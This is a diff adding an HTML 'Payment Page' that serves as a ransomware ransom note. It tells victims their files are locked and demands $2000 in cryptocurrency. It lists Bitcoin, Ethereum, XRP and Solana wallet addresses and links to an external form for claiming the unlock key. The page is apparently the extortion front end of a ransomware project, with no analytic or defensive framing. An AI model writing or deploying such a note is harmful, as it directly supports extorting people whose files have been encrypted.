@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Payment Page</title>
+        <style>
+            @font-face {
+                font-family: 'BarlowFont';
+                src: url('Barlow-Regular') format('truetype'),
+                     url('Barlow-Bold') format('truetype'),
+                     url('Barlow-Italic') format('truetype');
+            }
+            body {
+                background-color: #383838;
+            }
+            .center-div {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                width: 1000px;
+                height: 100vh;
+                background-color: antiquewhite;
+                font-family: 'BarlowFont', sans-serif;
+            }
+            img {
+                width: 250px;
+                height: 250px;
+            }
+            h1 {
+                margin-top: 100px;
+                text-align: center;
+            }
+            .content-div {
+                position: absolute;
+                top: 30%;
+                left: auto;
+                margin: 0px 10%;
+                text-decoration: underline;
+            }
+            ul {
+                padding-bottom: 20px;
+                list-style-type: none;
+            }
+            li {
+                padding-top: 10px;
+                font-weight: bold;
+            }
+            button {
+                width: 200px;
+                height: 50px;
+                text-align: center;
+                margin: auto 30%;
+                background-color: #428bff;
+                color: #FFFFFF;
+                font-size: 22px;
+                font-weight: bold;
+                border: #FFFFFF 1px solid;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="center-div">
+            <img src="ShawnSpencer.jpeg" alt="ShawnSpencer" style="float: left;">
+            <img src="Shawn-Michaels.jpg" alt="Shawn-Michaels" style="float: right;">
+            <h1>YOU HAVE BEEN LOCKED OUT OF YOUR FILES!</h1>
+            <div class="content-div">
+                <p>To obtain the special key to unlock your important files, please send the equivalent amount of $2000 in crypto assets to the respective addresses below:</p>
+                <ul>
+                    <li>BITCOIN ADDRESS:
+                        <ul>
+                            <li>bc1qk0w79pur5kkj2grmfkhmp4taulqmgjvgkdcndh</li>
+                        </ul>
+                    </li>
+                    <li>ETHEREUM ADDRESS:
+                        <ul>
+                            <li>0xE8285F2f8A52D485A62610316810baCaDbc0E03f</li>
+                        </ul>
+                    </li>
+                    <li>XRP ADDRESS:
+                        <ul>
+                            <li>rpaizD4N5X5QjNoDL4p9K8jB2VBbcbejVv</li>
+                            <li>No destination tag required</li>
+                        </ul>
+                    </li>
+                    <li>SOL ADDRESS:
+                        <ul>
+                            <li>9LiMRKRW3JVwQzSz9kMnfQSLnnDWN9V112sCg63bZFmv</li>
+                            <li>No memo required</li>
+                        </ul>
+                    </li>
+                </ul>
+                <p>After sending the payment to one of the addresses above, complete the form below, and wait approximately 72 hours to receive the key to unlock your files.</p>
+
+                <button id="goForm">Visit Form Page</button>
+                <script>
+                    var btn = document.getElementById("goForm");
+                    btn.addEventListener("click", function() {
+                        window.open("https://form.jotform.com/231725001025439");
+                    })
+                </script>
+            </div>
+        </div>
+    </body>
+</html>
